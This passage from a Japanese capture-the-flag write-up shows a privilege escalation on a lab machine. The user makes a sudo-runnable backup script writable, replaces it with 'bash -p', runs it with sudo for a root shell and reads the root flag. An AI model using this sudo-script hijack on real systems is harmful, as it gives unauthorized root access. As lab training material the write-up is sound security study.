alex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
```

書き込み権限を付ける

```shell
alex@ubuntu:~$ chmod 754 /etc/mp3backups/backup.sh
alex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh
-rwxr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
```

bash を実行するようスクリプトを書き換える

```text
#!/bin/bash

bash -p
```

sudo で実行

```shell
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
root@ubuntu:~# whoami
root
root@ubuntu:~# ls /root
root.txt
root@ubuntu:~# cat /root/root.txt
flag{Tha......}
```

ルートフラグゲット！

## 振り返り

- borg でリストアする経験を得たのがありがたい
